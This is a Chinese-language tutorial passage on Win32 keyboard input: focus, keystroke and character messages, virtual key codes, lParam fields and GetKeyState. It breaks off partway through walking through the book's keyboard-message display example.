<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SETFOCUS:</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;focused&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_KILLFOCUS:</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;left&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\desktop\myWin32&gt; g++ main.cpp -O0 -o main -lkernel32 -lgdi32 -luser32 -m32</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812084229815.png"
alt="焦点在windows终端" />
<figcaption aria-hidden="true">焦点在windows终端</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812084241047.png"
alt="焦点在the Hello Program" />
<figcaption aria-hidden="true">焦点在the Hello Program</figcaption>
</figure>
<h3 id="队列与同步">队列与同步</h3>
<p>键盘动作由键盘驱动程序转化为格式化的消息之后,首先发往windows消息队列,不会直接发往焦点窗口</p>
<p>这是因为,有的键盘消息具有修改焦点窗口的功能,比如Alt+F4可关闭当前窗口.又比如win+r可以打开运行框,此时窗口焦点自动放在运行框上</p>
<p>windows需要先看一看键盘消息是针对当前焦点窗口的还是针对整个系统的.</p>
<p>如果发生了焦点转移,那么windows需要保证后续的相应键盘消息指向新的焦点窗口</p>
<h2 id="击键消息">击键消息</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812085353287.png"
alt="image-20220812085353287" />
<figcaption aria-hidden="true">image-20220812085353287</figcaption>
</figure>
<p>其中系统键一般是Alt+其他键的组合键,比如Alt+Tab,切换任务窗口.</p>
<p>键按下之后如果不松开,会间隔一定时间(这个间隔在系统启动时BIOS中设置)之后进入连续输入状态(连续输入的速度也取决于BIOS中的设置),此时应用程序会收到一连串的WM_KEYDOWN或者WM_SYSKEYDOWN消息</p>
<p>系统键对于windows操作系统来说更加重要,应用程序一般忽略系统键信息,交给DefWindowProc处理.windows会处理所有Alt组合键信息</p>
<p>如果非得在应用程序中处理Alt消息,并且处理完成之后立刻返回,不调用DefWindowProc,那么系统键消息将会被应用程序截胡,不能发给操作系统.此时按下Alt+F4就无法关闭该窗口了</p>
<p>比如:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SYSKEYDOWN:</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sysKey down&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_SYSKEYUP:</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sysKey up&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>此时只会在终端上打印一下,但是只要时Alt键的消息都不会发往windows</p>
<p>当组合键中没有Alt时,不会产生系统键消息,顶多产生WM_KEYDOWN和WM_KEYUP,应用程序可以根据自己的兴趣选择处理其中的部分消息,如果应用程序不做处理,windows也不做处理</p>
<p>不管是系统键消息还是非系统键消息,不管是按下还是起来,所有的键盘消息都会伴随着wParam表示虚拟键代码,lParam包含本次击键的其他数据</p>
<h3 id="虚拟键代码wparam">虚拟键代码wParam</h3>
<p>捕获WM_KEYDOWN或者WM_KEYUP消息只能说明非系统键被按下或者松开了,单凭着一个信息无法判断谁被按下或者松开了.wParam就提供了更多的细节</p>
<p>该案件消息是一个枚举类型,大多数都以VK_开头</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> VK_LBUTTON 0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_RBUTTON 0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_CANCEL 0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_MBUTTON 0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_XBUTTON1 0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_XBUTTON2 0x06</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_BACK 0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_TAB 0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_CLEAR 0x0C</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_RETURN 0x0D</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_SHIFT 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_CONTROL 0x11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_MENU 0x12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VK_PAUSE 0x13</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>前两个鼠标动作貌似通过处理不到</p>
<p>数字键(不是右侧数字键盘,是左侧主键盘上一长条的数字键)和字母键:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812092101119.png"
alt="image-20220812092101119" />
<figcaption aria-hidden="true">image-20220812092101119</figcaption>
</figure>
<p>虽然键盘可以接收到键盘上<code>@#$%*</code>这种字符的消息,但是这是对于英语键盘而言的,对于欧洲人来说欧元符号比美元符号更加重要,如果要写出地区无关的代码,那么我们需要和windows操作系统协作处理键盘消息,对于有意义的字符的处理,<strong>一般使用字符消息,不使用击键消息</strong></p>
<p>微软键盘特有:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812092200252.png"
alt="image-20220812092200252" />
<figcaption aria-hidden="true">image-20220812092200252</figcaption>
</figure>
<p>需要给哪个键安排任务的时候就去查它的宏定义编码即可</p>
<h3 id="其他消息lparam">其他消息lParam</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812094137721.png"
alt="image-20220812094137721" />
<figcaption aria-hidden="true">image-20220812094137721</figcaption>
</figure>
<h4 id="重复计数repeat-count">重复计数Repeat Count</h4>
<p>低16位为重复计数,当一个键按下一直不松开时,应用程序会接收到一大串WM_KEYDOWN消息.如果窗口过程的处理速度跟不上,那么windows会把多个WM_KEYDOWN消息合并成一条消息,然后修改其lParam的低16位,决定这条消息重复了多少次</p>
<p>在比较卡顿的电脑上使用word有过这种体验,一直按着某个键不放,计算机可能不会实时跟着显示字符,但是一段时间后呼哧出来一摊这个字符</p>
<h4 id="oem扫描码">OEM扫描码</h4>
<p>历史古董了,现在几乎不用了</p>
<h4 id="拓展键标记extended-key-flag">拓展键标记Extended Key Flag</h4>
<p>对于IBM拓展键盘才有用,一般的键盘上已经有足够多的键用了,不需要拓展了</p>
<h4 id="内容代码context-code">内容代码Context Code</h4>
<p>如果Alt键被按下,则相应的键盘消息中该值为1</p>
<h4 id="先前状态previous-key-state">先前状态Previous Key State</h4>
<p>如果先前改键是松开的则该值为0</p>
<p>如果先前该键是按下的则该值为1</p>
<p>这个值可以用来去除重复输入,比如老年人动作缓慢,本来就只想输入一个A结果按下A忘了松开了
,可以判断先前该键的状态,如果也是按下的则抛弃</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">    <span class="keyword">if</span>((lParam&gt;&gt;<span class="number">30</span>)&amp;<span class="number">1</span>)&#123;<span class="comment">//lParam第31位是键先前状态,右移30位之后成为最低位,和1按位与只保留该位</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="转换状态transition-state">转换状态Transition State</h4>
<p>键正在被按下则转换状态为0</p>
<p>键正在被释放则转换状态为1</p>
<h3 id="转义状态">转义状态</h3>
<p>转义键:Shift,Alt,Ctrl</p>
<p>切换键:Caps Lock,Num Lock,Scroll Lock</p>
<p>区分主键盘上大小写输入就要看这些键的状态</p>
<p>考虑如何判断一套组合键都有谁按下了呢?比如Ctrl+F,首先按下的是Ctrl,然后按下F,但是按下F的时候引用程序已经处理过了Ctrl,现在只知道按下了F.这样看来是不是还得开一些变量记录刚才按下了谁呢?当Ctrl松开的时候这个变量置零,当Ctrl按下的时候这个变量置1.</p>
<p>windows操作系统确实是按照这个思想做的,它给我们代劳了.我们要判断Ctrl的状态,只需要<code>GetKeyState(VK_CONTROL);</code>就可以获取windows帮我们记录好的Ctrl状态了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHORT <span class="title function_">GetKeyState</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span> nVirtKey</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>当需要查询状态的键处于按下时,该函数返回负值.否则最低位置1</p>
<p>可以通过是否小于0或者和1按位与判断状态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(wParam&lt;=<span class="number">0x5A</span>&amp;&amp;wParam&gt;=<span class="number">0x41</span>)&#123;<span class="comment">//首先判断是不是英文字母</span></span><br><span class="line">    <span class="keyword">if</span>(GetKeyState(VK_CAPITAL))&#123;</span><br><span class="line">        szBuffer[cnt_keys]=wParam;<span class="comment">//大写字母添加进入缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        szBuffer[cnt_keys]=wParam-<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;a&#x27;</span>;<span class="comment">//小写字母添加进入缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line">    ++cnt_keys;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="应用">应用</h3>
<p>给滚动条添加键盘动作:</p>
<p>按下PgUp往前翻页,按下PgDn往后翻页</p>
<p>按上下键滚动一行</p>
<p>按左右键左右滚动一个字符的宽度</p>
<p>实际上直接发送信息处理滚动条消息即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">	<span class="keyword">switch</span> (wParam) &#123;</span><br><span class="line">	<span class="keyword">case</span> VK_HOME:</span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_BOTTOM, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_END:</span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_TOP, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_PRIOR:</span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_PAGEUP, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_NEXT:</span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_PAGEDOWN, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">case</span> VK_UP:</span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_LINEUP, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_DOWN:</span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_LINEDOWN, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_RIGHT:</span><br><span class="line">		SendMessage(hwnd, WM_HSCROLL, SB_LINERIGHT, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_LEFT:</span><br><span class="line">		SendMessage(hwnd, WM_HSCROLL, SB_LINELEFT, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="字符消息">字符消息</h2>
<h3 id="再看消息循环">再看消息循环</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    TranslateMessage(&amp;msg);</span><br><span class="line">    DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在主函数的最后,返回之前,像定式一样必须要有一个消息循环.</p>
<p>其中GetMessage从应用程序的消息队列中,获取一条新消息,用msg承载该消息</p>
<p>DispatchMessage将该消息分拣交给相应窗口</p>
<p>TranslageMessage将<strong>可打印字符</strong>的击键消息转换为<strong>字符消息</strong>,然后将该字符消息放入应用程序的消息队列</p>
<blockquote>
<p>可打印字符包括英文字母,阿拉伯数字,标点符号,运算符号等等</p>
<p>不包括Ctrl,Shift,Insert,Delete,Alt</p>
</blockquote>
<p>字符消息的种类:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812105605047.png"
alt="image-20220812105605047" />
<figcaption aria-hidden="true">image-20220812105605047</figcaption>
</figure>
<p>死字符只对需要重音符号的语言键盘有用,比如德语.可以忽略</p>
<p>应用程序主要就处理WM_CHAR消息,该消息从WM_KEYDOWN翻译而来.</p>
<p>WM_SYSCHAR消息从WM_SYSKEYDOWN翻译而来</p>
<h3 id="参数意义">参数意义</h3>
<p>对于字符消息,lParam参数的含义和击键消息相同</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812201421640.png"
alt="image-20220812201421640" />
<figcaption aria-hidden="true">image-20220812201421640</figcaption>
</figure>
<p>wParam是ANSI或者Unicode编码的字符码,这一点和击键消息中不同</p>
<p>具体是用的ANSI还是Unicode编码,要看注册窗口类的时候调用的是RegisterClassA还是RegisterClassW</p>
<blockquote>
<p>如果使用RegisterClass,最近的windows操作系统上会被宏定义为RegisterClassW.因为Windows
2000之后Unicode标识符就被定义了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegisterClass  RegisterClassW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegisterClass  RegisterClassA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="先来后到">先来后到</h3>
<p>当字符键盘比如'A'按下后,对于应用程序的消息队列</p>
<p>首先收到的是'A'的击键消息WM_KEYDOWN,虚拟键代码wParam=0x41</p>
<p>然后收到的是'A'的字符消息WM_CHAR,字符编码wParam=0x61</p>
<p>然后'A'松开时收到击键消息WM_KEYUP,虚拟键代码wParam=0x41</p>
<h3 id="各司其职">各司其职</h3>
<p>对于功能键比如Ctrl,Shift等等,作为虚拟键,需要处理WM_KEYDOWN消息</p>
<p>对于可打印字符就需要处理字符消息WM_CHAR</p>
<p>Tab,回车,空格,Esc作为控制字符也处理WM_CHAR</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812203020207.png"
alt="image-20220812203020207" />
<figcaption aria-hidden="true">image-20220812203020207</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line">    <span class="keyword">switch</span> (wParam)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\b&#x27;</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;space down&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\t&#x27;</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tab down&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Ctrl+Enter down&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\r&#x27;</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter down&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="应用-1">应用</h2>
<p>windows程序设计在此给出了一个例子,记录键盘动作并且输出到屏幕</p>
<p>分析其过程函数WndProc</p>
<h3 id="变量定义">变量定义</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">	<span class="type">static</span> <span class="type">int</span> cxClientMax, cyClientMax, cxClient, cyClient, cxChar, cyChar;</span><br><span class="line"><span class="comment">//cxClientMax为客户区最大宽度,根据该值决定保存显示哪一部分消息</span></span><br><span class="line"><span class="comment">//cxClient是客户区宽度</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cLinesMax, cLines;<span class="comment">//当前客户区最大能打印多少行,已经使用了多少行</span></span><br><span class="line">	<span class="type">static</span> PMSG pmsg;<span class="comment">//消息结构体</span></span><br><span class="line">	<span class="type">static</span> RECT rectScroll;<span class="comment">//客户区矩形</span></span><br><span class="line">	<span class="type">static</span> TCHAR szTop[] = TEXT(<span class="string">&quot;Message Key Char &quot;</span>)	TEXT(<span class="string">&quot;Repeat Scan Ext ALT Prev Tran&quot;</span>);<span class="comment">//顶部栏目</span></span><br><span class="line">	<span class="type">static</span> TCHAR szUnd[] = TEXT(<span class="string">&quot;_______ ___ ____ &quot;</span>)	TEXT(<span class="string">&quot;______ ____ ___ ___ ____ ____&quot;</span>);<span class="comment">//下划线 </span></span><br><span class="line">	<span class="type">static</span> TCHAR  szFormat[<span class="number">2</span>][<span class="number">100</span>] = &#123;<span class="comment">//格式化字符串,用于szTop和szUnd的打印格式</span></span><br><span class="line">		TEXT(<span class="string">&quot;%-13s %3d %-15s%c%6u %4d %3s %3s %4s %4s&quot;</span>),</span><br><span class="line">		TEXT(<span class="string">&quot;%-13s 0x%04X%1s%c %6u %4d %3s %3s %4s %4s&quot;</span>)</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> TCHAR  szYes[] = TEXT(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">	<span class="type">static</span> TCHAR szNo[] = TEXT(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">	<span class="type">static</span> TCHAR  szDown[] = TEXT(<span class="string">&quot;Down&quot;</span>);</span><br><span class="line">	<span class="type">static</span> TCHAR  szUp[] = TEXT(<span class="string">&quot;Up&quot;</span>);</span><br><span class="line">	<span class="type">static</span> TCHAR  szMessage[<span class="number">8</span>][<span class="number">100</span>] = &#123;<span class="comment">//八种键盘消息</span></span><br><span class="line">		TEXT(<span class="string">&quot;WM_KEYDOWN&quot;</span>), TEXT(<span class="string">&quot;WM_KEYUP&quot;</span>),</span><br><span class="line">		TEXT(<span class="string">&quot;WM_CHAR&quot;</span>), TEXT(<span class="string">&quot;WM_DEADCHAR&quot;</span>),</span><br><span class="line">		TEXT(<span class="string">&quot;WM_SYSKEYDOWN&quot;</span>),TEXT(<span class="string">&quot;WM_SYSKEYUP&quot;</span>),</span><br><span class="line">		TEXT(<span class="string">&quot;WM_SYSCHAR&quot;</span>), TEXT(<span class="string">&quot;WM_SYSDEADCHAR&quot;</span>) </span><br><span class="line">	&#125;;</span><br><span class="line">	HDC hdc;<span class="comment">//设备环境句柄</span></span><br><span class="line">	<span class="type">int</span> i, iType;<span class="comment">//循环变量,</span></span><br><span class="line">	PAINTSTRUCT ps;</span><br><span class="line">	TCHAR szBuffer[<span class="number">128</span>], szKeyName[<span class="number">32</span>];</span><br><span class="line">	TEXTMETRIC tm;<span class="comment">//字符信息结构体</span></span><br></pre></td></tr></table></figure>
<h4 id="pmsg">pmsg</h4>
<p>存放消息的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> &#123;</span></span><br><span class="line">    HWND        hwnd;</span><br><span class="line">    UINT        message;</span><br><span class="line">    WPARAM      wParam;</span><br><span class="line">    LPARAM      lParam;</span><br><span class="line">    DWORD       time;</span><br><span class="line">    POINT       pt;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _MAC</span></span><br><span class="line">    DWORD       lPrivate;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG;</span><br></pre></td></tr></table></figure>
<p>其前四个参数和WndProc窗口过程函数相同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK    <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br></pre></td></tr></table></figure>
<p>该结构体的作用就是完整记录一条消息,甚至连消息产生时间time都有记录</p>
<p>POINT pt记录的是发生该消息时鼠标的位置(相对于整块屏幕的坐标)</p>
<h4 id="ps">ps</h4>
<p>记录绘画信息的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> &#123;</span></span><br><span class="line">    HDC         hdc;</span><br><span class="line">    BOOL        fErase;</span><br><span class="line">    RECT        rcPaint;</span><br><span class="line">    BOOL        fRestore;</span><br><span class="line">    BOOL        fIncUpdate;</span><br><span class="line">    BYTE        rgbReserved[<span class="number">32</span>];</span><br><span class="line">&#125; PAINTSTRUCT, *PPAINTSTRUCT, *NPPAINTSTRUCT, *LPPAINTSTRUCT;</span><br></pre></td></tr></table></figure>
<h5 id="hdc">hdc</h5>
<p>设备环境句柄</p>
<h5 id="ferase">fErase</h5>
<p>表明背景是否擦除,非0则擦除</p>
<h5 id="rcpaint">rcPaint</h5>
<p>需要重绘的矩形范围</p>
<p>剩下三个成员尚未使用</p>
<h3 id="窗口创建和变形消息">窗口创建和变形消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line"><span class="keyword">case</span> WM_DISPLAYCHANGE:<span class="comment">//窗口最大化还有普通状态变化时获取该消息</span></span><br><span class="line">	<span class="comment">// Get maximum size of client area </span></span><br><span class="line">	cxClientMax = GetSystemMetrics(SM_CXMAXIMIZED);<span class="comment">//顶层窗口最大化时的宽度(像素)</span></span><br><span class="line">	cyClientMax = GetSystemMetrics(SM_CYMAXIMIZED);</span><br><span class="line">	<span class="comment">// Get character size for fixed-pitch font </span></span><br><span class="line">	hdc = GetDC(hwnd);</span><br><span class="line">	SelectObject(hdc, GetStockObject(SYSTEM_FIXED_FONT));<span class="comment">//使用系统等宽字体</span></span><br><span class="line">	GetTextMetrics(hdc, &amp;tm);<span class="comment">//获取系统等宽字体信息</span></span><br><span class="line">	cxChar = tm.tmAveCharWidth;<span class="comment">//字符宽度,列宽度</span></span><br><span class="line">	cyChar = tm.tmHeight+tm.tmExternalLeading;<span class="comment">//行高度</span></span><br><span class="line">	ReleaseDC(hwnd, hdc);</span><br><span class="line">	<span class="comment">// Allocate memory for display lines </span></span><br><span class="line">	<span class="keyword">if</span> (pmsg)<span class="comment">//如果pmsg非NULL则表明先前已经给他分配过堆空间,那么本次需要重新分配,先把以前的扬了</span></span><br><span class="line">		<span class="built_in">free</span>(pmsg);</span><br><span class="line">	cLinesMax = cyClientMax / cyChar;<span class="comment">//计算行数</span></span><br><span class="line">	pmsg = (PMSG)<span class="built_in">malloc</span>(cLinesMax * <span class="keyword">sizeof</span>(MSG));<span class="comment">//根据当前客户区大小决定pmsg数组大小</span></span><br><span class="line">	cLines = <span class="number">0</span>;<span class="comment">//已使用行数清零</span></span><br><span class="line">	<span class="comment">// fall through </span></span><br><span class="line">	<span class="comment">//此处没有返回直接继续执行case WM_SIZE标签中的内容</span></span><br><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	<span class="keyword">if</span> (message == WM_SIZE)<span class="comment">//由于能够到达此块的不止WM_SIZE消息,还有可能时WM_CREATE和WM_DISPLAYCHANGE</span></span><br><span class="line">	&#123;</span><br><span class="line">		cxClient = LOWORD(lParam);<span class="comment">//只有窗口尺寸发生变化时才重新获取客户区尺寸</span></span><br><span class="line">		cyClient = HIWORD(lParam);</span><br><span class="line">	